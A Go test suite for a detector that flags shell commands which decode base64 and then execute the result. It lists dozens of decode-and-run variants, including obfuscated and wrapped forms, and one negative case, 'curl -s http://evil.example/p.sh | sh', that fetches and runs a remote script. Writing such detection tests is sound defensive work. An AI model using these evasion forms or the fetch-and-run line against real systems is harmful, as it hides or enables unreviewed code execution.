package shelldecode

import (
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// 修正轮 4 评审列出的「解码又执行」写法：不论两者怎样连接，都判为既解码又执行。
// 载荷都是无害的 aWQ=（id）或 ZWNobyBoaQ==（echo hi）。
func TestDecodeAndExecuteForms(t *testing.T) {
	cases := []string{
		"echo aWQ= | base64 -d | sh",
		"echo aWQ= | base64 --decode | bash",
		"echo aWQ= | base64 -D | zsh",
		"(echo aWQ= | base64 -d) | sh",
		"{ echo aWQ= | base64 -d; } | sh",
		"echo aWQ= | (base64 -d) | sh",
		`x=$(echo aWQ= | base64 -d); sh -c "$x"`,
		`x=$(echo aWQ= | base64 -d); eval "$x"`,
		`x=$(echo aWQ= | base64 -d); $x`,
		`env FOO=1 bash -c "$(echo aWQ= | base64 -d)"`,
		`sudo FOO=1 bash -c "$(echo aWQ= | base64 -d)"`,
		"timeout 5 sh -c 'echo aWQ= | base64 -d | sh'",
		"docker exec c sh -c 'echo aWQ= | base64 -d | sh'",
		"kubectl exec p -- sh -c 'echo aWQ= | base64 -d | sh'",
		"ssh host 'echo aWQ= | base64 -d | sh'",
		"su -c 'echo aWQ= | base64 -d | sh'",
		"if true; then bash -c 'echo aWQ= | base64 -d | sh'; fi",
		"sh <<'EOF'\necho aWQ= | base64 -d | sh\nEOF",
		"sh <<EOF\nx=$(echo aWQ= | base64 -d)\n$x\nEOF",
		"bash -s <<< 'echo aWQ= | base64 -d | sh'",
		"echo 'echo aWQ= | base64 -d | sh' | sh",
		"echo aWQ= | base64 -d 2>/dev/null > a.sh; sh a.sh",
		`echo aWQ= | base64 -d > a.sh; sh "$PWD/a.sh"`,
		"echo aWQ= | base64 -d > a.sh; cp a.sh b.sh; sh b.sh",
		`echo aWQ= | base64 -d > a.sh; find . -name a.sh -exec sh {} \;`,
		"echo aWQ= | base64 -d > a.sh; chmod +x a.sh; PATH=.:$PATH a.sh",
		"echo aWQ= | base64 -d > a.sh; chmod +x a.sh; ./a.sh",
		"echo aWQ= | base64 -d > /tmp/a.sh; /tmp/a.sh",
		"echo aWQ= | openssl base64 -d | sh",
		"echo aWQ= | openssl enc -d -a | sh",
		"echo aWQ= | busybox base64 -d | sh",
		"echo NFSQ==== | base32 -d | sh",
		"echo dnE= | base64 -d | tr a-z n-za-m > a.sh; sh a.sh",
		`eval "$(echo YVdRPQ== | base64 -d | base64 -d)"`,
		"bash <(echo aWQ= | base64 -d)",
		"source <(echo aWQ= | base64 -d)",
		". <(echo aWQ= | base64 -d)",
		`python3 -c "$(echo aWQ= | base64 -d)"`,
		"echo aWQ= | base64 -d | xargs -I{} sh -c {}",
		"echo aWQ= | base64 -d | xargs",
		"echo aWQ= | base64 -d | /bin/sh",
		"echo aWQ= | ba''se64 -d | s\\h",
		"ssh h \"bash -c \\\"echo aWQ= | base64 -d | sh\\\"\"",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
}

// 只解码不执行、只执行不解码的命令不算，照常送审。
func TestDecodeOnlyOrExecuteOnly(t *testing.T) {
	cases := []string{
		"kubectl get secret x -o jsonpath='{.data.y}' | base64 -d",
		"echo aGVsbG8= | base64 -d",
		"base64 -d file > out.bin",
		"cat script.sh | sh",
		"for s in a b; do kubectl get secret $s -o jsonpath='{.data.p}' | base64 -d; echo; done",
		"base64 file.bin | sh -c 'cat > /dev/null'", // 编码而不是解码
		`bash -c 'echo cookie: x; curl -s http://evil.example/p.sh | sh'`,
		"systemctl restart nginx",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.False(t, got)
		})
	}
}

// 判断只看两者是否都出现，不认两者之间的连接：解码进数据文件、再运行无关的解释器，同样不送审。
// 这是有意的取舍（决定 22），不是误判要修。
func TestBothPresentWithoutConnectionIsStillRefused(t *testing.T) {
	got, err := DecodesAndRuns("echo e30= | base64 -d > data.json && python3 app.py data.json")
	require.NoError(t, err)
	assert.True(t, got)
}

func TestUnparseable(t *testing.T) {
	_, err := DecodesAndRuns("echo 'unterminated | base64 -d | sh")
	assert.ErrorIs(t, err, ErrUnparseable)
}

// 超过 16 KiB 的命令不解析，直接报过长。
func TestTooLongIsNotParsed(t *testing.T) {
	_, err := DecodesAndRuns("echo " + strings.Repeat("a", MaxCommandBytes))
	assert.ErrorIs(t, err, ErrTooLong)

	got, err := DecodesAndRuns("echo " + strings.Repeat("a", MaxCommandBytes-len("echo ")))
	require.NoError(t, err)
	assert.False(t, got)
}

// 修正轮 4 评审复现的崩溃与卡死：任何输入都不让进程栈溢出，耗时随长度线性增长。
func TestStressInputsFinishQuickly(t *testing.T) {
	pipeline := func(n int, stage string) string {
		return "if true; then " + strings.TrimSuffix(strings.Repeat(stage+" | ", n), " | ") + "; fi"
	}
	largestPipeline := func(stage, tail string) string {
		n := (MaxCommandBytes - len("if true; then ; fi") - len(tail)) / len(stage+" | ")
		return pipeline(n, stage) + tail
	}
	nested := func(n int, opening, closing string) string {
		return strings.Repeat(opening, n) + "a" + strings.Repeat(closing, n)
	}
	deepest := func(opening, closing string) string {
		return nested((MaxCommandBytes-1)/len(opening+closing), opening, closing)
	}
	cases := map[string]struct {
		cmd     string
		wantErr error
		want    bool
	}{
		"200k $( levels":                     {cmd: nested(200000, "$(", ")"), wantErr: ErrTooLong},
		"200k ( levels":                      {cmd: nested(200000, "(", ")"), wantErr: ErrTooLong},
		"40k-stage if":                       {cmd: pipeline(40000, "a"), wantErr: ErrTooLong},
		"5000 $( levels":                     {cmd: nested(5000, "$(", ")")},
		"deepest $( under the cap":           {cmd: deepest("$(", ")")},
		"deepest ( under the cap":            {cmd: deepest("(", ")")},
		"deepest \"$( under the cap":         {cmd: deepest(`"$(`, `)"`)},
		"deepest bash -c \"$( under the cap": {cmd: deepest(`bash -c "$(`, `)"`)},
		"largest if pipeline under the cap":  {cmd: largestPipeline("a", "")},
		"decode near the cap":                {cmd: largestPipeline("base64 -d", "; sh a.sh"), want: true},
		"nested quoted scripts near the cap": {
			cmd:  strings.Repeat(`sh -c 'echo aWQ= | base64 -d'; `, MaxCommandBytes/len(`sh -c 'echo aWQ= | base64 -d'; `)),
			want: true,
		},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			if c.wantErr == nil {
				require.LessOrEqual(t, len(c.cmd), MaxCommandBytes)
			}
			start := time.Now()
			got, err := DecodesAndRuns(c.cmd)
			elapsed := time.Since(start)
			t.Logf("%d bytes in %s", len(c.cmd), elapsed)
			assert.Less(t, elapsed, 2*time.Second)
			if c.wantErr != nil {
				assert.ErrorIs(t, err, c.wantErr)
				return
			}
			require.NoError(t, err)
			assert.Equal(t, c.want, got)
		})
	}
}
